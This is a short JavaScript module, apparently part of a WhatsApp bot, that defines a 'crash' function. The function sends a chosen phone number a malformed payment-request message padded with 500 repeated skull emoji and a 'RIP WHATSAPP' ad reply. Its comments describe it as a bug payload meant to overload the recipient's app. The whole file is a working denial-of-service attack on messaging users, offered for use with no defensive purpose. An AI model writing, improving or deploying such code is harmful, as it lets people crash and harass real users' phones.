// lib/crash.js - STABLE VERSION
async function xeoninvisible(sock, target) {
  try {
    target = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    
    // Payload Bug Basic (Payment)
    const message = {
      requestPaymentMessage: {
        currencyCodeIso4217: 'USD',
        amount1000: 999999999,
        requestFrom: target,
        noteMessage: {
          extendedTextMessage: {
            text: '☠️'.repeat(500), // Text overload
            contextInfo: {
              mentionedJid: [target],
              externalAdReply: {
                showAdAttribution: true,
                title: "🪦 RIP WHATSAPP 🪦",
                thumbnailUrl: "https://files.catbox.moe/2z1knq.jpg", // Pastikan URL valid/kecil
                sourceUrl: "wa.me/settings",
                mediaType: 1
              }
            }
          }
        }
      }
    };

    // Menggunakan relayMessage tanpa messageId custom yang sering error
    await sock.relayMessage(target, message, { participant: { jid: target } });
    
    return true;
  } catch (error) {
    console.error("Crash Error:", error);
    // Abaikan error connection closed, yang penting terkirim
    return false; 
  }
}

module.exports = { xeoninvisible };
